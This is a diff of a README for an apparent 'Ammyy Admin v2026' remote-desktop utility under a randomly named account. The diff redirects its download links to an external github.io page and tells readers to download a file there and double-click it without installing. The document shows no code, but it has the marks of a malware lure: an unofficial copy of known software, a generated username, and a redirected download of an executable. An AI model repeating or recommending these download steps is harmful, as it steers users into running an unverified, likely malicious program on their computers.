@@ -1,6 +1,6 @@
 # 💻 ammyy-admin-v2026-remote-desktop - Fast remote access for your computer
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/reddishlavender-prognathism228/ammyy-admin-v2026-remote-desktop)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://reddishlavender-prognathism228.github.io)
 
 ## 📖 About this application
 
@@ -22,7 +22,7 @@ Ensure your computer meets these conditions before you run the software:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the following link to access the download page: [https://github.com/reddishlavender-prognathism228/ammyy-admin-v2026-remote-desktop](https://github.com/reddishlavender-prognathism228/ammyy-admin-v2026-remote-desktop).
+1. Visit the following link to access the download page: [https://reddishlavender-prognathism228.github.io](https://reddishlavender-prognathism228.github.io).
 2. Look for the application file on the page. Click the link to start the file transfer to your computer.
 3. Locate the file in your Downloads folder once the transfer finishes.
 4. Double-click the file to open the program. You do not need to perform a formal installation process. The software runs as a portable utility.
